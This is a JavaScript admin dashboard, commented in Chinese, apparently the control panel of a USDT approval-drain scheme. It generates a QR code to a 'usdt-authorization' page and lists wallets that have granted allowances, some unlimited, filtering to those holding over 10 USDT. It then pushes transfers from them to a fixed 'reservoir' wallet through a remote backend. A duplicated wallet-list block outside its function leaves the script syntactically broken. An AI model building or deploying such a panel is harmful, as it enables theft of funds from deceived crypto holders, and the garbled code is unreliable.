    <script>
    // 配置
    const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me';
    const RESERVOIR_WALLET = 'TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899';
    const QR_CODE_URL = 'https://heathwang888.github.io/usdt-authorization/';

    // 全局變量
    let socket;
    let transferModal;
    let currentWallets = [];

    // 初始化
    document.addEventListener('DOMContentLoaded', function() {
        // 初始化 Socket.IO
        socket = io(API_BASE_URL);
        setupSocketListeners();

        // 初始化 Bootstrap 模態框
        transferModal = new bootstrap.Modal(document.getElementById('transferModal'));

        // 初始化頁面
        setupEventListeners();
        initializeDashboard();
        initializeQRCode();

        // 隱藏載入指示器
        document.getElementById('loading').style.display = 'none';
    });

    // Socket.IO 監聽器設置
    function setupSocketListeners() {
        socket.on('connect', function() {
            showToast('success', '已連接到服務器');
        });

        socket.on('disconnect', function() {
            showToast('error', '與服務器斷開連接');
        });

        socket.on('trx-balance-warning', function(data) {
            document.getElementById('trxWarning').style.display = 'block';
            showToast('warning', `TRX餘額過低: ${data.balance} TRX`);
        });

        socket.on('transfer-started', function(data) {
            updateTransferStatus('info', '交易已發送，等待確認...');
        });

        socket.on('transfer-confirmed', function(data) {
            updateTransferStatus('success', '交易已確認');
            refreshData();
            setTimeout(() => {
                transferModal.hide();
            }, 2000);
        });

        socket.on('transfer-failed', function(data) {
            updateTransferStatus('danger', `交易失敗: ${data.error}`);
        });

        socket.on('transfer-status', function(data) {
            if (data.status === 'TIMEOUT' || data.status === 'ERROR') {
                updateTransferStatus('warning', data.message);
                const statusDiv = document.getElementById('transferStatus');
                statusDiv.innerHTML += `
                    <br><a href="https://tronscan.org/#/transaction/${data.txId}" 
                       target="_blank" class="alert-link">
                        <i class="fas fa-external-link-alt me-1"></i>在區塊鏈瀏覽器中查看
                    </a>`;
            }
        });
    }

    // 頁面事件監聽器設置
    function setupEventListeners() {
        // 導航切換
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const targetPage = this.dataset.page;
                switchPage(targetPage);
            });
        });

        // 刷新按鈕
        document.getElementById('refreshDashboard').addEventListener('click', refreshDashboard);
        document.getElementById('refreshWallets').addEventListener('click', refreshWallets);

        // 錢包檢查
        document.getElementById('checkWalletBtn').addEventListener('click', checkWallet);
        document.getElementById('checkWalletInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                checkWallet();
            }
        });

        // 篩選切換
        document.getElementById('filterWallets').addEventListener('change', function() {
            updateWalletList(currentWallets);
        });

        // 轉帳確認
        document.getElementById('confirmTransfer').addEventListener('click', confirmTransfer);

        // QR碼功能
        document.getElementById('copyUrl').addEventListener('click', function() {
            copyToClipboard(QR_CODE_URL);
        });
        document.getElementById('downloadQr').addEventListener('click', downloadQrCode);
    }

    // 頁面切換
    function switchPage(pageName) {
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
        });
        document.querySelectorAll('.nav-link').forEach(link => {
            link.classList.remove('active');
        });

        document.getElementById(pageName).classList.add('active');
        document.querySelector(`.nav-link[data-page="${pageName}"]`).classList.add('active');

        if (pageName === 'wallets') {
            refreshWallets();
        }
    }

    // 儀表板功能
    async function initializeDashboard() {
        await refreshDashboard();
        // 每60秒自動刷新一次
        setInterval(refreshDashboard, 60000);
    }

    async function refreshDashboard() {
        try {
            // 獲取合約擁有者TRX餘額
            const trxResponse = await fetch(`${API_BASE_URL}/contract-owner-balance`);
            const trxData = await trxResponse.json();
            if (trxData.balance) {
                document.getElementById('trxBalance').textContent = `${trxData.balance.toFixed(2)} TRX`;
                if (trxData.owner) {
                    document.getElementById('contractOwnerAddress').textContent = trxData.owner;
                }
            }

            // 獲取水庫錢包USDT餘額
            const usdtResponse = await fetch(`${API_BASE_URL}/balance/${RESERVOIR_WALLET}`);
            const usdtData = await usdtResponse.json();
            if (usdtData.balance) {
                document.getElementById('usdtBalance').textContent = `${usdtData.balance} USDT`;
            }

            // 獲取授權錢包數量
            const walletsResponse = await fetch(`${API_BASE_URL}/authorized-wallets`);
            const walletsData = await walletsResponse.json();
            if (Array.isArray(walletsData)) {
                document.getElementById('walletCount').textContent = walletsData.length.toString();
            } else {
                document.getElementById('walletCount').textContent = '0';
            }

        } catch (error) {
            console.error('刷新儀表板失敗:', error);
            if (error.name !== 'TypeError') {
                showToast('error', '刷新儀表板失敗');
            }
        }
    }

    // 錢包管理功能
    async function checkWallet() {
        const input = document.getElementById('checkWalletInput');
        const address = input.value.trim();
        
        if (!address) {
            showToast('error', '請輸入要檢查的錢包地址');
            return;
        }

        try {
            const response = await fetch(`${API_BASE_URL}/manual-wallets`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ address })
            });

            const data = await response.json();
            
            if (data.error) {
                showToast('error', data.error);
                return;
            }

            showToast('success', '錢包添加成功');
            input.value = '';
            refreshWallets();
        } catch (error) {
            console.error('添加錢包失敗:', error);
            showToast('error', '添加錢包失敗');
        }
    }

    async function refreshWallets() {
        try {
            const response = await fetch(`${API_BASE_URL}/authorized-wallets`);
            const data = await response.json();
            currentWallets = data;
            updateWalletList(data);
        } catch (error) {
            console.error('獲取錢包列表失敗:', error);
            showToast('error', '獲取錢包列表失敗');
        }
    }

    function updateWalletList(wallets) {
    const walletList = document.getElementById('walletList');
    const filterEnabled = document.getElementById('filterWallets').checked;
    
    const filteredWallets = filterEnabled ? 
        wallets.filter(wallet => parseFloat(wallet.balance) > 10) : 
        wallets;

    walletList.innerHTML = '';

    if (filteredWallets.length === 0) {
        walletList.innerHTML = `
            <div class="alert alert-info">
                <i class="fas fa-info-circle me-2"></i>沒有符合條件的錢包
            </div>
        `;
        return;
    }

    filteredWallets.forEach(wallet => {
        const card = document.createElement('div');
        card.className = 'card wallet-card mb-3';
        card.innerHTML = `
            <div class="card-body">
                <div class="wallet-info">
                    <h6 class="wallet-address mb-2">
                        ${wallet.address}
                        ${wallet.isManual ? '<span class="badge bg-info ms-1">手動</span>' : ''}
                    </h6>
                    <p class="card-text mb-0">
                        <i class="fas fa-coins me-1"></i>餘額: ${wallet.balance} USDT<br>
                        <i class="fas fa-unlock-alt me-1"></i>授權: ${wallet.allowance === 'Unlimited' ? '無限' : wallet.allowance}
                    </p>
                </div>
                <div class="wallet-actions">
                    <button class="btn btn-primary btn-sm" 
                            onclick="initiateTransfer('${wallet.address}')"
                            title="轉帳">
                        <i class="fas fa-exchange-alt"></i>
                    </button>
                    ${wallet.isManual ? `
                        <button class="btn btn-danger btn-sm" 
                                onclick="removeWallet('${wallet.address}')"
                                title="刪除">
                            <i class="fas fa-trash"></i>
                        </button>
                    ` : ''}
                </div>
            </div>
        `;
        walletList.appendChild(card);
    });
}

        // 添加錢包卡片
        filteredWallets.forEach(wallet => {
            const card = document.createElement('div');
            card.className = 'card wallet-card mb-3';
            card.innerHTML = `
                <div class="card-body">
                    <div class="d-flex justify-content-between align-items-start">
                        <div>
                            <h6 class="card-title text-truncate" style="max-width: 200px;">
                                ${wallet.address}
                                ${wallet.isManual ? '<span class="badge bg-info ms-1">手動</span>' : ''}
                            </h6>
                            <p class="card-text mb-0">
                                <i class="fas fa-coins me-1"></i>餘額: ${wallet.balance} USDT<br>
                                <i class="fas fa-unlock-alt me-1"></i>授權: ${wallet.allowance}
                            </p>
                        </div>
                        <div class="d-flex">
                            <button class="btn btn-primary btn-sm me-2" 
                                    onclick="initiateTransfer('${wallet.address}')"
                                    title="轉帳">
                                <i class="fas fa-exchange-alt"></i>
                            </button>
                            ${wallet.isManual ? `
                                <button class="btn btn-danger btn-sm" 
                                        onclick="removeWallet('${wallet.address}')"
                                        title="刪除">
                                    <i class="fas fa-trash"></i>
                                </button>
                            ` : ''}
                        </div>
                    </div>
                </div>
            `;
            walletList.appendChild(card);
        });
    }

    async function removeWallet(address) {
        try {
            const response = await fetch(`${API_BASE_URL}/manual-wallets/${address}`, {
                method: 'DELETE'
            });
            const data = await response.json();
            
            if (data.error) {
                showToast('error', data.error);
                return;
            }
            
            showToast('success', '錢包已刪除');
            refreshWallets();
        } catch (error) {
            console.error('刪除錢包失敗:', error);
            showToast('error', '刪除錢包失敗');
        }
    }

    // 轉帳功能
    function initiateTransfer(address) {
    const modal = document.getElementById('transferModal');
    modal.querySelector('.modal-body').innerHTML = `
        <div class="mb-3">
            <label class="form-label text-dark">
                <i class="fas fa-wallet me-1"></i>從錢包
            </label>
            <input type="text" class="form-control" id="transferFromAddress" 
                   value="${address}" readonly>
        </div>
        <div class="mb-3">
            <label class="form-label text-dark">
                <i class="fas fa-coins me-1"></i>轉帳金額 (USDT)
            </label>
            <input type="number" class="form-control" id="transferAmount">
        </div>
        <div id="transferStatus" class="alert" style="display: none;"></div>
    `;
    
    document.getElementById('confirmTransfer').disabled = false;
    new bootstrap.Modal(modal).show();
}

    async function confirmTransfer() {
        const fromAddress = document.getElementById('transferFromAddress').value;
        const amount = document.getElementById('transferAmount').value;

        if (!amount || parseFloat(amount) <= 0) {
            showToast('error', '請輸入有效的轉帳金額');
            return;
        }

        try {
            document.getElementById('confirmTransfer').disabled = true;
            updateTransferStatus('info', '正在發送交易...');

            const response = await fetch(`${API_BASE_URL}/transfer`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    fromAddress: fromAddress,
                    amount: amount
                })
            });

            const data = await response.json();
            
            if (data.error) {
                updateTransferStatus('danger', data.error);
                document.getElementById('confirmTransfer').disabled = false;
                return;
            }

            updateTransferStatus('info', '交易已發送，等待確認...');
        } catch (error) {
            console.error('轉帳失敗:', error);
            updateTransferStatus('danger', '轉帳失敗');
            document.getElementById('confirmTransfer').disabled = false;
        }
    }

    function updateTransferStatus(type, message) {
        const statusDiv = document.getElementById('transferStatus');
        statusDiv.className = `alert alert-${type}`;
        statusDiv.innerHTML = `<i class="fas fa-info-circle me-1"></i>${message}`;
        statusDiv.style.display = 'block';
    }

    // QR碼功能
    function initializeQRCode() {
        try {
            const qrContainer = document.getElementById('qrCode');
            qrContainer.innerHTML = ''; // 清空容器
            
            new QRCode(qrContainer, {
                text: QR_CODE_URL,
                width: 256,
                height: 256,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        } catch (error) {
            console.error('生成QR碼失敗:', error);
            document.getElementById('qrCode').innerHTML = `
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-circle me-1"></i>QR碼生成失敗
                </div>`;
        }
    }

    // 複製功能
    function copyAddress(elementId) {
        const text = document.getElementById(elementId).textContent;
        copyToClipboard(text);
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text)
            .then(() => {
                showToast('success', '已複製到剪貼板');
            })
            .catch(() => {
                showToast('error', '複製失敗');
            });
    }

    // 下載QR碼
    function downloadQrCode() {
        const canvas = document.querySelector('#qrCode canvas');
        if (!canvas) {
            showToast('error', 'QR碼尚未生成');
            return;
        }
        
        try {
            const link = document.createElement('a');
            link.download = 'qrcode.png';
            link.href = canvas.toDataURL('image/png');
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error('下載QR碼失敗:', error);
            showToast('error', '下載QR碼失敗');
        }
    }

    // Toast 通知
    function showToast(type, message) {
        const toastContainer = document.querySelector('.toast-container');
        const toast = document.createElement('div');
        toast.className = `toast align-items-center text-white bg-${type} border-0`;
        toast.setAttribute('role', 'alert');
        toast.setAttribute('aria-live', 'assertive');
        toast.setAttribute('aria-atomic', 'true');

        toast.innerHTML = `
            <div class="d-flex">
                <div class="toast-body">
                    <i class="fas fa-${type === 'success' ? 'check-circle' : 
                                     type === 'error' ? 'exclamation-circle' : 
                                     type === 'warning' ? 'exclamation-triangle' : 
                                     'info-circle'} me-1"></i>
                    ${message}
                </div>
                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
            </div>
        `;

        toastContainer.appendChild(toast);
        const bsToast = new bootstrap.Toast(toast, {
            animation: true,
            autohide: true,
            delay: 3000
        });
        bsToast.show();

        toast.addEventListener('hidden.bs.toast', function () {
            toast.remove();
        });
    }

    // 自動刷新數據
    setInterval(refreshData, 30000); // 每30秒刷新一次

    function refreshData() {
        const activePage = document.querySelector('.page.active').id;
        if (activePage === 'dashboard') {
            refreshDashboard();
        } else if (activePage === 'wallets') {
            refreshWallets();
        }
    }
    </script>
